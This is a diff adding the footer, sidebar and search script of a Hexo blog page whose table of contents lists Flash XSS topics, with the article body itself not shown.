+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Owasp-top-10/" rel="tag"><i class="fa fa-tag"></i> Owasp top 10</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/26/shiyanbar_sql/" rel="next" title="实验吧一次有趣的sql注入">
+                <i class="fa fa-chevron-left"></i> 实验吧一次有趣的sql注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/26/XSS实战方面/" rel="prev" title="XSS杂七杂八">
+                XSS杂七杂八 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#flash安全沙盒"><span class="nav-number">1.</span> <span class="nav-text">flash安全沙盒</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#授权"><span class="nav-number">1.0.1.</span> <span class="nav-text">授权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FLASH代码"><span class="nav-number">1.0.2.</span> <span class="nav-text">FLASH代码:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#小结："><span class="nav-number">1.0.3.</span> <span class="nav-text">小结：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FLASH代码-1"><span class="nav-number">1.0.4.</span> <span class="nav-text">FLASH代码:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#访问"><span class="nav-number">1.0.5.</span> <span class="nav-text">访问:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Flash-ExternalInterface-call-XSS"><span class="nav-number">1.0.6.</span> <span class="nav-text">Flash ExternalInterface.call XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FLASH代码-2"><span class="nav-number">1.0.7.</span> <span class="nav-text">FLASH代码:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FLASH代码-3"><span class="nav-number">1.0.8.</span> <span class="nav-text">FLASH代码:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Flash-HTMLText-XSS"><span class="nav-number">1.0.9.</span> <span class="nav-text">Flash HTMLText XSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FLASH代码-4"><span class="nav-number">1.0.10.</span> <span class="nav-text">FLASH代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#flash-XSF加载第三方文件函数"><span class="nav-number">1.0.11.</span> <span class="nav-text">flash XSF加载第三方文件函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是XSF"><span class="nav-number">1.0.12.</span> <span class="nav-text">什么是XSF?</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#未初始化变量导致的XSS"><span class="nav-number">1.0.13.</span> <span class="nav-text">未初始化变量导致的XSS</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
